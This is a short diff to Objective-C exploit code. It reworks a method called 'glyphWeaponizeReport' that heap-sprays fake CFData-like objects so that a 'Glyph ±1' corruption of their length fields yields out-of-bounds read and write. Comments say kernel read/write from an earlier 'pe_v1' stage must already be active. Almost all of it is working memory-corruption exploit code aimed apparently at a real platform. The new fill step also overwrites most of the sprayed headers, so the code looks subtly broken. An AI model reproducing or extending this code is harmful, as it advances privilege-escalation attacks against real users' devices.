@@ -1246,13 +1246,12 @@ cleanup:
 // ---------------------------------------------------------------------------
 // Typed object: u32 length fields + OOB report via Glyph ±1 pair
 // PREREQUISITE: KRW must be active (pe_v1 first) — walk goes through spray.
-// Fill: repeating 32-byte objects {u32 len=0x20; u32 size=0x100; u8 data[24]}
-// Glyph ±1 pair corrupts a u32 length → ±65535 delta → OOB.
+// Typed CFData length spray: {u64 tag; u32 length; u32 pad; u8 data[]}
+// Glyph ±1 corrupts length → OOB read/write.
 // ---------------------------------------------------------------------------
 + (NSString *)glyphWeaponizeReport:(NSString *)forceName {
     NSMutableString *r = [NSMutableString string];
-    [r appendString:@"\n=== R5m: Typed object — u32 length + Glyph OOB ===\n"];
-    [r appendString:@"  PREREQUISITE: KRW active (run pe_v1 first)\n"];
+    [r appendString:@"\n=== R5m: Typed CFData length + Glyph OOB ===\n"];
 
     NSString *vname = forceName.length ? forceName : @"calif";
     size_t spraySz = 4288;
@@ -1264,16 +1263,17 @@ cleanup:
     if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
     int got = 0, holes = 0;
 
-    // Fill with typed 32-byte objects: u32 len=0x20, u32 size=0x100 (TARGET), 24 bytes data
+    // Fill: CFData-like objects {u64 tag=0x43464441; u32 length=0x100; u32 pad; u8 data[]}
     for (int i = 0; i < NBUFS; i++) {
         void *b = malloc(spraySz);
         if (!b) break;
         uint8_t *p = (uint8_t *)b;
-        for (size_t o = 0; o + OBJ_SZ <= spraySz - 8; o += OBJ_SZ) {
-            *(uint32_t *)(p + o) = OBJ_LEN;           // length (Glyph corrupts this)
-            *(uint32_t *)(p + o + 4) = 0x00000100;    // size TARGET (OOB write hits this)
-            memset(p + o + 8, 0x41, OBJ_SZ - 8);      // data fill
+        for (size_t o = 0; o + 16 <= spraySz - 8; o += 16) {
+            *(uint64_t *)(p + o) = 0x4346444154410001ULL;  // tag 'CFDATA\0\1'
+            *(uint32_t *)(p + o + 8) = 0x00000100;          // length = 256
+            *(uint32_t *)(p + o + 12) = 0x00000200;         // capacity
         }
+        memset(p + 16, 0x41, spraySz - 16);  // data fill
         *(uint64_t *)(p + spraySz - 8) = (uint64_t)i;
         bufs[i] = b;
         got++;
